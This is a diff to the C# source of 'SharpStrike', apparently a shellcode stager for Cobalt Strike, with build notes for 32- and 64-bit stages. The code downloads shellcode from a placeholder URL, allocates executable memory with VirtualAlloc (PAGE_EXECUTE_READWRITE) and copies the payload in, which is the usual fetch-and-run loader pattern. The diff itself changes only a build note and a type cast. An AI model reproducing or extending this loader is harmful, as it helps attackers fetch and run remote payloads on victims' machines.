@@ -6,7 +6,8 @@
    For 32bit Compilation, just compile as any CPU (if you are using a CS 32bit stage)
    For 64bit Com[ilation, you MUST create a new target type, make it 64bit then compile it as 64bit (if you are using staged 64bit in CS)
    
-   Compiled in Visual Studio 2017
+   Compiled in Visual Studio Community edition 2019
+   Uses .NET Framework 2.0
 */
 
 using System;
@@ -40,7 +41,7 @@ namespace SharpStrike
             byte [] shellcode = wc.DownloadData("hxxp://YourUrl.com/URIstage");
 
             //Alloc the memory with the right flags
-            IntPtr stageBuf = VirtualAlloc(IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            IntPtr stageBuf = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             
             //Copy stage from Managed to Unmanaged MemoryBuffer 
             Marshal.Copy(shellcode, 0, stageBuf, shellcode.Length);
